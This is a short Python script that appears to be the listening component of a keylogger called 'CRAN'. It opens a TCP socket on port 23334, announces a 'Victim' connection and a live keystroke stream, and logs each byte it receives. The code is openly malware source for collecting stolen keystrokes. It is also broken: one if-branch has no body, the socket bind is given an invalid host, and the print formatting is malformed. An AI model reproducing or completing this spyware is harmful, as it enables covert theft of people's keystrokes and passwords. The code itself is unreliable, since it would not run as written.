import socket, sys

black="\033[0;30m"
red="\033[0;91m"
green="\033[0;92m"
yellow="\033[0;93m"
blue="\033[0;94m"
purple="\033[0;95m"
cyan="\033[0;36m"
white="\033[0;97m"

save=''
shift=False
unknown=False

def log(key):
	if shift == True:
		if key == "":
			return
		if key == "2":
	if key == "":
		shift=True

def receiver():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.bind((0, 23334))
	sock.listen()
	con, host = sock.accept()
	print ("%s[CRAN]%s Victim [ %s ] Connected!", green, yellow, host)
	print ("%s[CRAN]%s Keystrokes Live Stream Started!\n\n", green, yellow)

	while(True):
		ktx = con.recv(1)
		if not ktx:
			break
		log(ktx)


save=open("test.txt", "w")

